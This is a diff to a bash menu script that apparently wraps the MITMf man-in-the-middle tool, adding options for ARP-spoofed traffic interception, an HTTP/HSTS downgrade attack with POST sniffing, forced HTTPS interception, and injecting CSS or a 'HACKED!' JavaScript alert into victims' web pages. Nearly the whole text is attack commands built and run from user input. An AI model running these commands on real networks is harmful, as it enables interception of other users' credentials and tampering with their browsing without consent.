@@ -24,7 +24,7 @@ then
 	echo ""
 	echo "Specify targets (comma seperated or range -), followed by [ENTER]:"
 	read targets
-	COMMAND=$COMMAND" -T "$targets
+	COMMAND=$COMMAND" -T $targets"
 fi
 echo ""
 echo "Do you want to reroute traffic on the network(spoofing), [Y/n]"
@@ -42,28 +42,46 @@ echo "Select an option:"
 echo "(0) run this command"
 echo "(1) see the traffic"
 echo "(2) kill the traffic"
+echo "(3) HTTP and HSTS attack + sniff"
+echo "(4) Force sniff HTTPS traffic (loud)"
+echo "(5) Make all pages pink"
+echo "(6) Inject HACKED! js alert"
 echo "(c) custom command"
 read option
 echo "just a moment ..."
 echo ""
 if [ "$option" = "0" ]; then
-	$COMMAND
+	echo $COMMAND
+	$(echo $COMMAND)
 fi
 if [ "$option" = "1" ]; then
-	$COMMAND" -X"
+	echo $COMMAND" -X"
+	$(echo $COMMAND" -X")
 fi
 if [ "$option" = "2" ]; then
-	$COMMAND" --kill"
+	echo $COMMAND" --kill"
+	$(echo $COMMAND" --kill")
 fi
 if [ "$option" = "3" ]; then
-	$COMMAND" --proxy -P POST"
+	echo $COMMAND" --proxy -P POST"
+	$(echo $COMMAND" --proxy -P POST")
 fi
 if [ "$option" = "4" ]; then
-	$COMMAND" --proxy --proxy-https -P POST"
+	echo $COMMAND" --proxy --proxy-https -P POST"
+	$(echo $COMMAND" --proxy --proxy-https -P POST")
+fi
+if [ "$option" = "5" ]; then
+	echo $(echo $COMMAND" --proxy-module injectcss --css-file pink.css")
+	$(echo $COMMAND" --proxy-module injectcss --css-file pink.css")
+fi
+if [ "$option" = "6" ]; then
+	echo $COMMAND" --proxy-module injectjs --js-data 'alert("HACKED!")'"
+	$(echo $COMMAND" --proxy-module injectjs --js-data 'alert("HACKED!")'")
 fi
 if [ "$option" = "c" ]; then
 	echo "type your custom command:"
 	read custom
 	echo ""
-	$COMMAND" "$custom
+	echo $COMMAND" "$custom
+	$(echo $COMMAND" "$custom)
 fi
